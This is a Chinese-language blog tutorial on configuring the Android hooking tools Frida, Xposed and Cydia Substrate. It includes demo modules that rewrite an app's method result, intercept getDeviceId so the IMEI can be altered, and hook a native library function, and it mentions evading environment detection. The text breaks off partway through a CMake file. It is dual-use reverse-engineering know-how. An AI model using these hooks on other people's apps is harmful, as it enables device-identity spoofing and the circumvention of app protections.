    <content type="html"><![CDATA[<p>Java层Hook工具，应用较多的有Xposed和Friday；so层Hook工具常用Substrate。</p><p><strong>Frida：</strong></p><p>动态插桩工具，使用Python、JavaScript共同完成。主要hook逻辑在JavaScript中完成，Python脚本负责将JS脚本传递给Android系统中的frida-server。</p><p>frida需要在root环境下执行，在移动端安装frida-server服务，并将设备连接至服务端。服务端需配置Linux环境和SDK PlatformTools，配置adb和fastboot环境变量。</p><p>与Xposed相比，Frida更改hook程序后无需重启系统，可直接重写方法体。Frida还可以hookNative层函数。</p><p><strong>Xposed:</strong></p><p>主要用于监控APP行为,改变原程序逻辑，沙箱定制（主要关注反环境检测）；</p><p>hook重载方法时，可忽略参数，使用hookAllMethods()，对于多个构造方法的hook，可使用hookAllConstructors()方法。</p><p>由于dalvik环境下xposed对multidex的支持没有很好的通用解决方案，寻找目标函数会发生ClassNotFoundError，所以处理multidex需要一些技巧（Tips）: 此问题因为classloader出错引起的，所以要寻找attachBaseContext 的classloader，而非lpparam.classLoader（此思路来自非虫前辈）。</p><h2 id="Frida配置"><a href="#Frida配置" class="headerlink" title="Frida配置"></a>Frida配置</h2><p>这里介绍Android中Frida的环境配置。分为服务端和客户端两个部分。</p><h3 id="一、环境准备"><a href="#一、环境准备" class="headerlink" title="一、环境准备"></a>一、环境准备</h3><h4 id="1-1-客户端配置"><a href="#1-1-客户端配置" class="headerlink" title="1.1 客户端配置"></a>1.1 客户端配置</h4><p>客户端的配置是在PC端，需要首先安装Python环境，配置pip模块。然后，执行命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install frida </span><br><span class="line">pip install frida-tools</span><br></pre></td></tr></table></figure><p>然后执行<code>pip list</code>查看是否安装成功。</p><p><img src="frida1.PNG" alt=""></p><h4 id="1-2-服务端配置"><a href="#1-2-服务端配置" class="headerlink" title="1.2 服务端配置"></a>1.2 服务端配置</h4><p>服务端配置是在Android端。</p><p>首先，查看测试机的CPU架构：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell cat &#x2F;proc&#x2F;cpuinfo</span><br></pre></td></tr></table></figure><p>结果显示：</p><p><img src="arm64.PNG" alt=""></p><p>即为ARM64.</p><p>然后，下载与客户端frida<strong>对应版本</strong>、与测试机<strong>架构相同</strong>的frida-server压缩包。</p><p>地址： <a href="https://github.com/frida/frida/releases" target="_blank" rel="noopener">https://github.com/frida/frida/releases</a></p><p>注意：服务端frida-server版本与客户端frida版本必须相同才能正常运行。</p><p>下载之后，解压，并将解压得到的文件传入测试机/data/local/tmp目录下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb push frida-server &#x2F;data&#x2F;local&#x2F;tmp *# adb push 参数1 参数2*</span><br><span class="line">adb shell cd data&#x2F;local&#x2F;tmp </span><br><span class="line">chmod 777 frida-server</span><br></pre></td></tr></table></figure><p><strong>注意：</strong>最好使用真机，模拟器会因为架构兼容模式从而使得程序报错。</p><p>执行frida-servcer: <code>./freda-server</code></p><p>另起一个终端，配置端口转发： <code>adb forward tcp:27043 tcp:27043</code></p><p>执行<strong>frida-ps -U</strong>测试是否启动成功，如图：</p><p><img src="frida2.PNG" alt=""></p><p>至此，frida环境配置和启动完成。</p><h3 id="二、模块编写"><a href="#二、模块编写" class="headerlink" title="二、模块编写"></a>二、模块编写</h3><p>可以使用JS或Python编写hook脚本，示例可以参考官方文档<a href="https://frida.re/docs/examples/android/。具体编写示例会在后续博客中详述。" target="_blank" rel="noopener">https://frida.re/docs/examples/android/。具体编写示例会在后续博客中详述。</a></p><p>若使用JS hook，只需执行： <code>frida -U -f hookpackagename -l test.js --no-pause</code>。</p><p>若使用Python，则直接执行<code>python3 test.py</code>即可。</p><h2 id="Xposed-Hook配置"><a href="#Xposed-Hook配置" class="headerlink" title="Xposed Hook配置"></a><strong>Xposed Hook</strong>配置</h2><h3 id="一、Xposed安装"><a href="#一、Xposed安装" class="headerlink" title="一、Xposed安装"></a>一、Xposed安装</h3><h4 id="1-1-模拟器"><a href="#1-1-模拟器" class="headerlink" title="1.1 模拟器"></a>1.1 模拟器</h4><p>模拟器采用网易MuMu，Android版本号6.0.1</p><h4 id="1-2-Xposed安装包下载"><a href="#1-2-Xposed安装包下载" class="headerlink" title="1.2 Xposed安装包下载"></a>1.2 Xposed安装包下载</h4><p><strong>下载地址：</strong><a href="https://forum.xda-developers.com/showthread.php?t=3034811" target="_blank" rel="noopener">https://forum.xda-developers.com/showthread.php?t=3034811</a></p><p><strong>下载如下图所示安装包：</strong></p><p><img src="ejhasa7c7AAJLRpS__thumbnail.PNG" alt=""></p><h4 id="1-3-安装"><a href="#1-3-安装" class="headerlink" title="1.3 安装"></a>1.3 安装</h4><p>直接把安装包拖入到MuMu模拟器中即可。  </p><h4 id="1-4-激活Xposed框架"><a href="#1-4-激活Xposed框架" class="headerlink" title="1.4 激活Xposed框架"></a>1.4 激活Xposed框架</h4><p><strong>1.4.1 关闭应用兼容性</strong></p><p>Xposed激活需要关闭MuMu设置中的应用兼容性，操作步骤如下：</p><p>打开设置，找到应用兼容性，关闭按钮，使其处于灰色状态</p><p><img src="gOGuQXlDPnQkiQxt__thumbnail.PNG" alt=""></p><p><img src="Wf44dfz8sKM3sYxW__thumbnail.PNG" alt=""></p><p><strong>1.4.2 激活Xposed框架</strong></p><p>打开“Xposed Installer”应用，点击下图表识先进行下载。</p><p><img src="ZAgsXfQrvsMsoyke__thumbnail.PNG" alt=""></p><p>下载完成会跳出如下界面，如没有跳出，请再点击一下</p><p><img src="qJi8xKL32jsnH5Ta__thumbnail.PNG" alt=""></p><p><strong>1.4.3 重新开启应用兼容性</strong></p><p>重新开启“应用兼容性”，使模拟器能同时运行x86软件和arm软件。</p><p><strong>步骤一：</strong>打开设置，找到应用兼容性</p><p><strong>步骤二：</strong>点击按钮，使其处于绿色状态，即开启状态</p><h3 id="二、Xposed模块编写"><a href="#二、Xposed模块编写" class="headerlink" title="二、Xposed模块编写"></a>二、Xposed模块编写</h3><h4 id="2-1-配置AndroidManifest-xml"><a href="#2-1-配置AndroidManifest-xml" class="headerlink" title="2.1 配置AndroidManifest.xml"></a>2.1 配置AndroidManifest.xml</h4><ol><li>使用Android Studio新建一个Android工程</li><li>然后在AndroidManifest.xml中插入如下代码</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta-data </span><br><span class="line">android:name&#x3D;&quot;xposedmodule&quot; </span><br><span class="line">android:value&#x3D;&quot;true&quot; &#x2F;&gt;</span><br><span class="line">&lt;meta-data </span><br><span class="line">android:name&#x3D;&quot;xposeddescription&quot; </span><br><span class="line">android:value&#x3D;&quot;这是一个Xposed例程&quot; &#x2F;&gt;</span><br><span class="line">&lt;meta-data </span><br><span class="line">android:name&#x3D;&quot;xposedminversion&quot; </span><br><span class="line">android:value&#x3D;&quot;54&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure><p><img src="manifest.PNG" alt=""></p><h4 id="2-2-配置build-gradle"><a href="#2-2-配置build-gradle" class="headerlink" title="2.2 配置build.gradle"></a>2.2 配置build.gradle</h4><p>在build.gradle中添加如下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">repositories &#123; jcenter()&#125;</span><br></pre></td></tr></table></figure><p>以及</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compileOnly &#39;de.robv.android.xposed:api:82&#39;compileOnly &#39;de.robv.android.xposed:api:82:sources&#39;</span><br></pre></td></tr></table></figure><p>这句代码是告诉AndroidStuido使用jcenter作为代码仓库，从这个仓库里远程寻找 de.robv.android.xposed:api:82 这个API。这个网上很少有Xposed教程介绍它的！（我们不用自己找XposedBridgeApi.jar了。注意！此处要用compileOnly这个修饰符！网上有些写的是provide ，现在已经停用了！）</p><p>插入位置如下图，</p><p><img src="gradle.PNG" alt=""></p><h4 id="2-3-Hook-实践"><a href="#2-3-Hook-实践" class="headerlink" title="2.3 Hook 实践"></a>2.3 Hook 实践</h4><p><strong>2.3.1 创建Button</strong></p><p>创建一个Button控件，用于测试Hook</p><p>在MainActivity中写入如下代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String TAG = <span class="string">"Tag"</span>;</span><br><span class="line">    <span class="keyword">private</span> Button button;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        button = findViewById(R.id.button);</span><br><span class="line"></span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                Toast.makeText(MainActivity.<span class="keyword">this</span>, toastMessage(), Toast.LENGTH_SHORT).show();</span><br><span class="line">                <span class="comment">//getContacts();</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toastMessage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我未被劫持"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2.3.2 测试为hook代码</strong></p><p>测试代码，运行后点击Button控件</p><p><strong>2.3.3 hook代码编写</strong></p><p>在MainActivity的同级路径下新建一个类“HookTest.java”，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by fanqiliang on 2018/12/25.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HookTest</span> <span class="keyword">implements</span> <span class="title">IXposedHookLoadPackage</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="comment">// "com.wanbang.xposedemo"为自己代码的包名</span></span><br><span class="line">        <span class="keyword">if</span> (lpparam.packageName.equals(<span class="string">"com.wanbang.xposedemo"</span>)) &#123;</span><br><span class="line">            XposedBridge.log(<span class="string">" has Hooked!"</span>);</span><br><span class="line">            <span class="comment">// "com.wanbang.xposedemo.MainActivity"为自己代码的类名</span></span><br><span class="line">            Class clazz = lpparam.classLoader.loadClass(<span class="string">"com.wanbang.xposedemo.MainActivity"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// "toastMessage"为需要Hook的方法名</span></span><br><span class="line">            XposedHelpers.findAndHookMethod(clazz, <span class="string">"toastMessage"</span>, <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                    <span class="keyword">super</span>.beforeHookedMethod(param);</span><br><span class="line">                    XposedBridge.log(<span class="string">"BBBB has Hooked!"</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                    param.setResult(<span class="string">"你已被劫持"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2.3.4 添加入口点</strong></p><ol><li>新建assets 文件夹</li></ol><p>右键点击 “main ” 文件夹 ， 选择new –&gt; Folder –&gt;Assets Folder，输入文件夹名为assets，如下图所示：</p><p><img src="newassets.PNG" alt=""></p><p>新建后结构如下图：</p><p><img src="assets1.PNG" alt=""></p><ol><li>新建xposed_init文件,在assets文件夹下新建xposed_init文件，如下入所示</li></ol><p><img src="xposed_init1.PNG" alt=""></p><p><img src="xposed_init2.PNG" alt=""></p><ol><li>配置xposed_init</li></ol><p>在xposed_init文件中输入hook代码的类名，类名需要写全路径（即包名+类名）。如下图是我编写的HookTest类，全路径为com..wanbang.xposedome.HookTest,</p><p><img src="xposed_init3.PNG" alt=""></p><p>因此在xposed_init写入如下全路径</p><p><img src="xposed_init4.PNG" alt=""></p><p><strong>2.3.5 禁用 Instant Run</strong></p><p>单击File -&gt; Settings -&gt; Build, Execution, Deployment -&gt; Instant Run，把勾全部去掉(该路径为Mac系统的路径，其他系统可查找相应路径)，具体如下图所示：</p><p><img src="5.PNG" alt=""></p><p><strong>注意：每次修改代码都需重启Xposed</strong></p><h2 id="Cydia-Hook-配置"><a href="#Cydia-Hook-配置" class="headerlink" title="Cydia Hook 配置"></a><strong>Cydia Hook</strong> 配置</h2><h3 id="一、环境准备-1"><a href="#一、环境准备-1" class="headerlink" title="一、环境准备"></a>一、环境准备</h3><h4 id="1-1-模拟器-1"><a href="#1-1-模拟器-1" class="headerlink" title="1.1 模拟器"></a>1.1 模拟器</h4><p>经测试Substrate的apk包在很多模拟器中都无法正常运行，此处使用Genymotion的Google Nexys4 机型。</p><h4 id="1-2-相关包下载"><a href="#1-2-相关包下载" class="headerlink" title="1.2 相关包下载"></a>1.2 相关包下载</h4><p>apk包：<a href="http://www.cydiasubstrate.com/" target="_blank" rel="noopener">http://www.cydiasubstrate.com/</a></p><p>sdk下载：<a href="http://asdk.cydiasubstrate.com/zips/cydia_substrate-r2.zip" target="_blank" rel="noopener">http://asdk.cydiasubstrate.com/zips/cydia_substrate-r2.zip</a></p><p>apk包下载后，安装至模拟器中，授予root权限。打开应用，如图：</p><p><img src="https://uploader.shimo.im/f/wl8UR9POi3ELsZmK.png!thumbnail" alt="img"></p><h3 id="二、模块编写-1"><a href="#二、模块编写-1" class="headerlink" title="二、模块编写"></a>二、模块编写</h3><h4 id="2-1-java层hook"><a href="#2-1-java层hook" class="headerlink" title="2.1 java层hook"></a>2.1 java层hook</h4><p><strong>2.1.1 配置AndroidManifest.xml</strong></p><p>（1）增加权限：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;uses-permission android:name&#x3D;&quot;cydia.permission.SUBSTRATE&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure><p>（2）Application标签中增加：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta-data android:name&#x3D;&quot;com.saurik.substrate.main&quot; android:value&#x3D;&quot;.Main&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure><p>注：此处.Main文件是模块的入口文件，完成路径为：’packageName’.Main</p><p><img src="https://uploader.shimo.im/f/zbZwcjmeH3AtFLnl.png!thumbnail" alt="img"></p><p><strong>2.1.2 导入jar包</strong></p><p>将下载的sdk包解压缩，取出substrate-api.jar，放在libs目录下，并Add As Library</p><p><strong>2.1.3 编写hook代码</strong></p><p>在Main类中添加方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">static void initialize() &#123; &#x2F;&#x2F; ... code to run when extension is loaded &#125;</span><br></pre></td></tr></table></figure><p>具体的hook代码可以写在这个方法中。</p><p>如，hook TelePhonyManager中的getDeviceId()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">initialize</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        MS.hookClassLoad(<span class="string">"android.telephony.TelephonyManager"</span>,</span><br><span class="line">                <span class="keyword">new</span> MS.ClassLoadHook() &#123;</span><br><span class="line">                    <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">                    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">classLoaded</span><span class="params">(Class&lt;?&gt; arg0)</span> </span>&#123;</span><br><span class="line">                        Method hookimei;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            hookimei = arg0.getMethod(<span class="string">"getDeviceId"</span>, <span class="keyword">null</span>);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">                            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                            hookimei = <span class="keyword">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (hookimei != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">final</span> MS.MethodPointer old1 = <span class="keyword">new</span> MS.MethodPointer();</span><br><span class="line">                            MS.hookMethod(arg0, hookimei, <span class="keyword">new</span> MS.MethodHook() &#123;</span><br><span class="line">                                <span class="meta">@Override</span></span><br><span class="line">                                <span class="function"><span class="keyword">public</span> Object <span class="title">invoked</span><span class="params">(Object arg0,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                      Object... arg1)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                                    <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">                                    String imei = (String) old1.invoke(arg0,</span><br><span class="line">                                            arg1);</span><br><span class="line">                                            <span class="comment">//此处可对imei进行修改</span></span><br><span class="line">                                    <span class="keyword">return</span> imei;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;, old1);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-2-Native层hook"><a href="#2-2-Native层hook" class="headerlink" title="2.2 Native层hook"></a>2.2 Native层hook</h4><p><strong>2.2.1 相关文件导入和新建</strong></p><p>（1）在src/main目录下新建目录jni</p><p><img src="https://uploader.shimo.im/f/Rud1Vpx39MgBuxQN.png!thumbnail" alt="img"></p><p>（2）向目录中添加Cydia sdk包中的.h头文件和两个.so库；（由于测试环境为模拟器，因此仅放了x86类型的so文件）</p><p>（3） 在jni目录下新建.cpp文件，</p><p>本例中为module.cpp：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"substrate.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;android/log.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//配置，这里是hook可运行程序（即NDK小程序）的写法，下面那个就是hook dvm的写法</span></span><br><span class="line">MSConfig(MSFilterExecutable,<span class="string">"/system/bin/app_process"</span>)</span><br><span class="line"><span class="comment">//MSConfig(MSFilterLibrary, "libdvm.so");</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//旧的函数地址，目的为了保留指向原来函数的入口，在新的函数执行</span></span><br><span class="line"><span class="comment">//完后，一般会再调用该函数，以确保程序的正常运行</span></span><br><span class="line"><span class="keyword">char</span>* (* stringFromJNI)(<span class="keyword">void</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//新的函数，替代hook的函数，返回修改后的值</span></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">newHello</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//直接返回新的字符串</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"cydia hook native success!"</span>;</span><br><span class="line">    <span class="comment">//执行原函数，确保程序运行正常，但这里代码简单，可以直接返回字符串即可</span></span><br><span class="line">    <span class="comment">//return hello();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过so库的绝对路径和函数名，找到其函数的映射地址</span></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">lookup_symbol</span><span class="params">(<span class="keyword">char</span>* libraryname,<span class="keyword">char</span>* symbolname)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//获取so库的句柄</span></span><br><span class="line">    <span class="keyword">void</span> *handle = dlopen(libraryname, RTLD_GLOBAL | RTLD_NOW);</span><br><span class="line">    <span class="keyword">if</span> (handle != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="comment">//根据so库句柄和符号名（即函数名）获取函数地址</span></span><br><span class="line">        <span class="keyword">void</span> * symbol = dlsym(handle, symbolname);</span><br><span class="line">        <span class="keyword">if</span> (symbol != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> symbol;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MSInitialize</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//获取hook函数的地址,最好不要用下面MS提供的方法</span></span><br><span class="line">    <span class="keyword">void</span> * symbol = lookup_symbol(<span class="string">"/data/data/com.example.cydiatestdemo/lib/cydiatest-jni.so"</span>,<span class="string">"stringFromJNI"</span>);</span><br><span class="line"><span class="comment">//    MSImageRef  image=MSGetImageByName("/data/data/com.samuelzhan.hello/lib/libhello.so");</span></span><br><span class="line"><span class="comment">//    void *symbol=MSFindSymbol(image, "createHello");</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//这里将旧函数的入口（参数一）指向hello(参数三），然后执行新函数（参数二）</span></span><br><span class="line">    MSHookFunction(symbol, (<span class="keyword">void</span>*)&amp;newHello, (<span class="keyword">void</span>**)&amp;stringFromJNI);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（4）生成Android.mk：Build -&gt; Make Project ，会报错，但不用管 。进入：app/build/intermediates/ndk/debug目录，取出Android.mk，放在src/main/jni目录下。</p><p><strong>2.2.2 相关配置</strong></p><p>（1）build.gradle</p><p><img src="https://uploader.shimo.im/f/KFRnUuSSgbkLsfsJ.png!thumbnail" alt="img"></p><p>defaultConfig内：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">externalNativeBuild &#123;</span><br><span class="line">    cmake &#123;</span><br><span class="line">        cppFlags &quot;&quot;</span><br><span class="line">        &#x2F;&#x2F;生成多个版本的so文件</span><br><span class="line">        abiFilters &#39;x86&#39;,&#39;x86_64&#39;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>android内：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">externalNativeBuild &#123;</span><br><span class="line">    cmake &#123;</span><br><span class="line">        path &quot;CMakeLists.txt&quot;  &#x2F;&#x2F; 设置所要编写的c源码位置，以及编译后so文件的名字</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（2）拷入CMakeLists.txt，放在与build.gradle同级目录下（即app目录下）</p><p>注意：生成的module必须以.cy为后缀</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 